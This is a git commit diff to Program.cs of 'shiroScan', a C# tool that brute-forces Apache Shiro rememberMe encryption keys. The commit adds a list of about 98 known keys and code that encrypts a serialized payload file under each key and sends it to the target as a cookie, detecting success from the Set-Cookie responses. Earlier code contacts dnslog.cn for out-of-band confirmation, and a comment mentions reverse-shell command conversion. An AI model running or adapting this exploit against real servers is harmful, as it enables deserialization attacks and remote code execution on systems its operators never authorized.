1a54b3a1beea4a0d913a99b079052461ca5ba25e
XingYun-Cloud <43715449+XingYun-Cloud@users.noreply.github.com>
2020-08-09 16:05:47 +0800

    Update Program.cs
    更改验证方式，不再依赖dns，不出网也可正常验证

--- Program.cs
+++ Program.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Text;
 using org.apache.shiro.crypto;
@@ -9,6 +9,9 @@ using System.Threading;
 using System.Text.RegularExpressions;
 using System.Security.Cryptography.X509Certificates;
 using System.Net.Security;
+using sun.reflect.generics.tree;
+using java.security;
+using com.sun.tools.corba.se.idl.constExpr;
 
 namespace shiroScan
 {
@@ -28,24 +31,43 @@ namespace shiroScan
 
         static void Main(string[] args)
         {
-            if (args.Length < 1)
+            if (args.Length != 1)
             {
-                Console.WriteLine("shiroScan.exe url");
-                Process.GetCurrentProcess().Kill();
-            }
-            
-            // 查看是否有rememberMe=deleteMe返回，以此判断是否为shiro
-            bool isShiro = Tools.isShiro(args[0]);
-            Console.WriteLine("isShiro：" + isShiro);
-            if (!isShiro)
-            {
+                Console.WriteLine("shiroScan.exe http?s://url");
                 Process.GetCurrentProcess().Kill();
             }
 
+
+            // 查看是否有rememberMe=deleteMe返回，以此判断是否为shiro
+            int shiroNum = Tools.isShiro(args[0]);
+            Console.WriteLine("shiroCookieCount：" + shiroNum);
+            if (shiroNum <= 0)
+            {
+                Console.WriteLine("not shiro");
+                Process.GetCurrentProcess().Kill();
+            }
+            else
+            {
+                Console.WriteLine("isShiro");
+            }
+
+            // 开始跑
+            bool isSuccess = NoDnsScan.noDnsMain(args[0], shiroNum);
+            if (!isSuccess)
+            {
+                Console.WriteLine("fail");
+            }
+
+            return;
+
             string dnslogSession = "PHPSESSID="+Guid.NewGuid().ToString();
-            string dnslogDomain = Tools.requestHttp("http://www.dnslog.cn/getdomain.php", dnslogSession);
-            //Console.WriteLine("dnslogSession -> " + dnslogSession);
-            //Console.WriteLine("dnslogDomain -> " + dnslogDomain);
+            string dnslogDomain = "";
+            using (var streamReader = new StreamReader(Tools.requestHttp("http://www.dnslog.cn/getdomain.php", dnslogSession).GetResponseStream()))
+            {
+                dnslogDomain = streamReader.ReadToEnd();
+            }
+            Console.WriteLine("dnslogSession -> " + dnslogSession);
+            Console.WriteLine("dnslogDomain -> " + dnslogDomain);
 
 
             // 开始循环遍历module，每个module开一个线程去遍历key
@@ -63,6 +85,159 @@ namespace shiroScan
         }
     }
 
+    class NoDnsScan
+    {
+        static Dictionary<string, string> keyList = new Dictionary<string, string>()
+        {
+            {"k1","kPH+bIxk5D2deZiIxcaaaA=="},
+            {"k2","4AvVhmFLUs0KTA3Kprsdag=="},
+            {"k3","Z3VucwAAAAAAAAAAAAAAAA=="},
+            {"k4","fCq+/xW488hMTCD+cmJ3aQ=="},
+            {"k7","1QWLxg+NYmxraMoxAXu/Iw=="},
+            {"k9","2AvVhdsgUs0FSA3SDFAdag=="},
+            {"k10","3AvVhmFLUs0KTA3Kprsdag=="},
+            {"k12","r0e3c16IdVkouZgk1TKVMg=="},
+            {"k13","5aaC5qKm5oqA5pyvAAAAAA=="},
+            {"k14","5AvVhmFLUs0KTA3Kprsdag=="},
+            {"k17","6ZmI6I2j5Y+R5aSn5ZOlAA=="},
+            {"k26","bWljcm9zAAAAAAAAAAAAAA=="},
+            {"k27","bWluZS1hc3NldC1rZXk6QQ=="},
+            {"k29","ZUdsaGJuSmxibVI2ZHc9PQ=="},
+            {"k30","wGiHplamyXlVB11UXWol8g=="},
+            {"k31","U3ByaW5nQmxhZGUAAAAAAA=="},
+            {"k32","MTIzNDU2Nzg5MGFiY2RlZg=="},
+            {"k33","L7RioUULEFhRyxM7a2R/Yg=="},
+            {"k34","a2VlcE9uR29pbmdBbmRGaQ=="},
+            {"k35","WcfHGU25gNnTxTlmJMeSpw=="},
+            {"k5","0AvVhmFLUs0KTA3Kprsdag=="},
+            {"k6","1AvVhdsgUs0FSA3SDFAdag=="},
+            {"k8","25BsmdYwjnfcWmnhAciDDg=="},
+            {"k11","3JvYhmBLUs0ETA5Kprsdag=="},
+            {"k15","6AvVhmFLUs0KTA3Kprsdag=="},
+            {"k16","6NfXkC7YVCV5DASIrEm1Rg=="},
+            {"k18","cmVtZW1iZXJNZQAAAAAAAA=="},
+            {"k19","7AvVhmFLUs0KTA3Kprsdag=="},
+            {"k20","8AvVhmFLUs0KTA3Kprsdag=="},
+            {"k21","8BvVhmFLUs0KTA3Kprsdag=="},
+            {"k22","9AvVhmFLUs0KTA3Kprsdag=="},
+            {"k23","OUHYQzxQ/W9e/UjiAGu6rg=="},
+            {"k24","a3dvbmcAAAAAAAAAAAAAAA=="},
+            {"k25","aU1pcmFjbGVpTWlyYWNsZQ=="},
+            {"k28","bXRvbnMAAAAAAAAAAAAAAA=="},
+            {"k36","OY//C4rhfwNxCQAQCrQQ1Q=="},
+            {"k37","5J7bIJIV0LQSN3c9LPitBQ=="},
+            {"k38","f/SY5TIve5WWzT4aQlABJA=="},
+            {"k39","bya2HkYo57u6fWh5theAWw=="},
+            {"k40","WuB+y2gcHRnY2Lg9+Aqmqg=="},
+            {"k41","kPv59vyqzj00x11LXJZTjJ2UHW48jzHN"},
+            {"k42","3qDVdLawoIr1xFd6ietnwg=="},
+            {"k43","SDKOLKn2J1j/2BHjeZwAoQ=="},
+            {"k44","YI1+nBV//m7ELrIyDHm6DQ=="},
+            {"k45","6Zm+6I2j5Y+R5aS+5ZOlAA=="},
+            {"k46","2A2V+RFLUs+eTA3Kpr+dag=="},
+            {"k47","6ZmI6I2j3Y+R1aSn5BOlAA=="},
+            {"k48","SkZpbmFsQmxhZGUAAAAAAA=="},
+            {"k49","2cVtiE83c4lIrELJwKGJUw=="},
+            {"k50","fsHspZw/92PrS3XrPW+vxw=="},
+            {"k51","XTx6CKLo/SdSgub+OPHSrw=="},
+            {"k52","sHdIjUN6tzhl8xZMG3ULCQ=="},
+            {"k53","O4pdf+7e+mZe8NyxMTPJmQ=="},
+            {"k54","HWrBltGvEZc14h9VpMvZWw=="},
+            {"k55","rPNqM6uKFCyaL10AK51UkQ=="},
+            {"k56","Y1JxNSPXVwMkyvES/kJGeQ=="},
+            {"k57","lT2UvDUmQwewm6mMoiw4Ig=="},
+            {"k58","MPdCMZ9urzEA50JDlDYYDg=="},
+            {"k59","xVmmoltfpb8tTceuT5R7Bw=="},
+            {"k60","c+3hFGPjbgzGdrC+MHgoRQ=="},
+            {"k61","ClLk69oNcA3m+s0jIMIkpg=="},
+            {"k62","Bf7MfkNR0axGGptozrebag=="},
+            {"k63","1tC/xrDYs8ey+sa3emtiYw=="},
+            {"k64","ZmFsYWRvLnh5ei5zaGlybw=="},
+            {"k65","cGhyYWNrY3RmREUhfiMkZA=="},
+            {"k66","IduElDUpDDXE677ZkhhKnQ=="},
+            {"k67","yeAAo1E8BOeAYfBlm4NG9Q=="},
+            {"k68","cGljYXMAAAAAAAAAAAAAAA=="},
+            {"k69","2itfW92XazYRi5ltW0M2yA=="},
+            {"k70","XgGkgqGqYrix9lI6vxcrRw=="},
+            {"k71","ertVhmFLUs0KTA3Kprsdag=="},
+            {"k72","5AvVhmFLUS0ATA4Kprsdag=="},
+            {"k73","s0KTA3mFLUprK4AvVhsdag=="},
+            {"k74","hBlzKg78ajaZuTE0VLzDDg=="},
+            {"k75","9FvVhtFLUs0KnA3Kprsdyg=="},
+            {"k76","d2ViUmVtZW1iZXJNZUtleQ=="},
+            {"k77","yNeUgSzL/CfiWw1GALg6Ag=="},
+            {"k78","NGk/3cQ6F5/UNPRh8LpMIg=="},
+            {"k79","4BvVhmFLUs0KTA3Kprsdag=="},
+            {"k80","MzVeSkYyWTI2OFVLZjRzZg=="},
+            {"k82","empodDEyMwAAAAAAAAAAAA=="},
+            {"k83","A7UzJgh1+EWj5oBFi+mSgw=="},
+            {"k84","c2hpcm9fYmF0aXMzMgAAAA=="},
+            {"k85","i45FVt72K2kLgvFrJtoZRw=="},
+            {"k86","U3BAbW5nQmxhZGUAAAAAAA=="},
+            {"k87","ZnJlc2h6Y24xMjM0NTY3OA=="},
+            {"k88","Jt3C93kMR9D5e8QzwfsiMw=="},
+            {"k89","MTIzNDU2NzgxMjM0NTY3OA=="},
+            {"k90","vXP33AonIp9bFwGl7aT7rA=="},
+            {"k91","V2hhdCBUaGUgSGVsbAAAAA=="},
+            {"k92","Z3h6eWd4enklMjElMjElMjE=="},
+            {"k93","Q01TX0JGTFlLRVlfMjAxOQ=="},
+            {"k94","ZAvph3dsQs0FSL3SDFAdag=="},
+            {"k95","Is9zJ3pzNh2cgTHB4ua3+Q=="},
+            {"k96","NsZXjXVklWPZwOfkvk6kUA=="},
+            {"k97","GAevYnznvgNCURavBhCr1w=="},
+            {"k98","66v1O8keKNV3TTcGPK1wzg=="}
+        };
+
+        public static string getRememberMe(string keyS)
+        {
+            // 以字节形式读取 poc.ser 
+            byte[] textBytes = File.ReadAllBytes($@"poc.ser");
+
+            // new一个org.apache.shiro.crypto.AesCipherService，不需要额外设置，默认就是AES/128/CBC
+            AesCipherService aesCipherService = new AesCipherService();
+            // base64解码keyS为keyB
+            // byte[] key = Convert.FromBase64String("kPH+bIxk5D2deZiIxcaaaA==");
+            byte[] keyB = Convert.FromBase64String(keyS);
+            // 调用shiro加密方法并返回byteArray
+            byte[] encrptByte = aesCipherService.encrypt(textBytes, keyB).getBytes();
+            // base64编码
+            string encrptText = Convert.ToBase64String(encrptByte);
+
+            return "rememberMe=" + encrptText;
+        }
+
+        public static bool noDnsMain(string uri, int shiroNum)
+        {
+            foreach (KeyValuePair<string, string> key in keyList)
+            {
+                string cookie = getRememberMe(key.Value);
+
+                try
+                {
+                    HttpWebResponse response = Tools.requestHttp(uri, cookie);
+
+                    string s = "";
+                    foreach (var i in response.Headers.GetValues("Set-Cookie"))
+                    {
+                        s += i;
+                    }
+                    response.Close();
+                    int shiroCookieCount = Tools.getRememberMeCount(s);
+                    if (shiroCookieCount < shiroNum)
+                    {
+                        Console.WriteLine($"key is -> {key.Value}");
+                        return true;
+                    }
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+            }
+            return false;
+        }
+    }
+
     class Tools
     {
         public static bool CheckValidationResult(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
@@ -70,8 +245,8 @@ namespace shiroScan
             return true;
         }
 
-        // 查看是否有rememberMe=deleteMe返回
-        public static bool isShiro(string uri)
+        // 查看是否有rememberMe=deleteMe返回，并return标识rememberMe=deleteMe的数量
+        public static int isShiro(string uri)
         {
             ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(CheckValidationResult);
 
@@ -82,14 +257,23 @@ namespace shiroScan
 
             HttpWebResponse response = request.GetResponse() as HttpWebResponse;
             //Console.WriteLine((int)response.StatusCode);
+            string s = "";
             foreach (var i in response.Headers.GetValues("Set-Cookie"))
             {
-                if (i.Contains("rememberMe=deleteMe"))
-                {
-                    return true;
-                }
+                s += i;
             }
-            return false;
+            response.Close();
+
+            int shiroCount = getRememberMeCount(s);
+
+            return shiroCount;
+        }
+
+        // 获取rememberMe标识的数量
+        public static int getRememberMeCount(string c)
+        {
+            int i = c.Split(new string[] { "rememberMe=deleteMe" }, StringSplitOptions.None).Length - 1;
+            return i;
         }
 
         // 反弹shell时，转换为javaRuntime适用的字符串数组
@@ -132,24 +316,26 @@ namespace shiroScan
         }
 
         // http请求
-        public static string requestHttp(string uri, string cookies)
+        public static HttpWebResponse requestHttp(string uri, string cookies)
         {
             HttpWebRequest request = WebRequest.Create(uri) as HttpWebRequest;
             request.Method = WebRequestMethods.Http.Get;
+            request.Timeout = 5000;
             request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
             request.Headers.Add("Cookie", $"{cookies}");
 
             // 发起请求，并获取返回信息
-            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
+            return request.GetResponse() as HttpWebResponse;
+
 
             // 响应状态转为响应码
             // Console.WriteLine((int)response.StatusCode);
 
             // Stream转为string
-            using (var streamReader = new StreamReader(response.GetResponseStream()))
-            {
-                return streamReader.ReadToEnd();
-            }
+            //using (var streamReader = new StreamReader(response.GetResponseStream()))
+            //{
+            //    return streamReader.ReadToEnd();
+            //}
         }
     }
 
@@ -249,22 +435,21 @@ namespace shiroScan
             {"k80","MzVeSkYyWTI2OFVLZjRzZg=="},
             {"k82","empodDEyMwAAAAAAAAAAAA=="},
             {"k83","A7UzJgh1+EWj5oBFi+mSgw=="},
-            {"k84","YTM0NZomIzI2OTsmIzM0NTueYQ=="},
-            {"k85","c2hpcm9fYmF0aXMzMgAAAA=="},
-            {"k86","i45FVt72K2kLgvFrJtoZRw=="},
-            {"k87","U3BAbW5nQmxhZGUAAAAAAA=="},
-            {"k88","ZnJlc2h6Y24xMjM0NTY3OA=="},
-            {"k89","Jt3C93kMR9D5e8QzwfsiMw=="},
-            {"k90","MTIzNDU2NzgxMjM0NTY3OA=="},
-            {"k91","vXP33AonIp9bFwGl7aT7rA=="},
-            {"k92","V2hhdCBUaGUgSGVsbAAAAA=="},
-            {"k93","Z3h6eWd4enklMjElMjElMjE="},
-            {"k94","Q01TX0JGTFlLRVlfMjAxOQ=="},
-            {"k95","ZAvph3dsQs0FSL3SDFAdag=="},
-            {"k96","Is9zJ3pzNh2cgTHB4ua3+Q=="},
-            {"k97","NsZXjXVklWPZwOfkvk6kUA=="},
-            {"k98","GAevYnznvgNCURavBhCr1w=="},
-            {"k99","66v1O8keKNV3TTcGPK1wzg=="}
+            {"k84","c2hpcm9fYmF0aXMzMgAAAA=="},
+            {"k85","i45FVt72K2kLgvFrJtoZRw=="},
+            {"k86","U3BAbW5nQmxhZGUAAAAAAA=="},
+            {"k87","ZnJlc2h6Y24xMjM0NTY3OA=="},
+            {"k88","Jt3C93kMR9D5e8QzwfsiMw=="},
+            {"k89","MTIzNDU2NzgxMjM0NTY3OA=="},
+            {"k90","vXP33AonIp9bFwGl7aT7rA=="},
+            {"k91","V2hhdCBUaGUgSGVsbAAAAA=="},
+            {"k92","Z3h6eWd4enklMjElMjElMjE=="},
+            {"k93","Q01TX0JGTFlLRVlfMjAxOQ=="},
+            {"k94","ZAvph3dsQs0FSL3SDFAdag=="},
+            {"k95","Is9zJ3pzNh2cgTHB4ua3+Q=="},
+            {"k96","NsZXjXVklWPZwOfkvk6kUA=="},
+            {"k97","GAevYnznvgNCURavBhCr1w=="},
+            {"k98","66v1O8keKNV3TTcGPK1wzg=="}
         };
         public string moduleValue;
         public string moduleKey;
@@ -279,10 +464,14 @@ namespace shiroScan
             {
                 string rememberMe = Tools.get_rememberMe(key.Value, key.Key, moduleValue, moduleKey, dnslogDomain);
 
-                //Console.WriteLine($"{moduleValue} - {key.Value}");
+                // Console.WriteLine($"{moduleValue} - {key.Value}");
                 Tools.requestHttp(scanUri, rememberMe);
 
-                string dnslog = Tools.requestHttp("http://www.dnslog.cn/getrecords.php", dnslogSession);
+                string dnslog = "";
+                using (var streamReader = new StreamReader(Tools.requestHttp("http://www.dnslog.cn/getrecords.php", dnslogSession).GetResponseStream()))
+                {
+                    dnslog = streamReader.ReadToEnd();
+                }
 
                 if (dnslog.Length > 2)
                 {
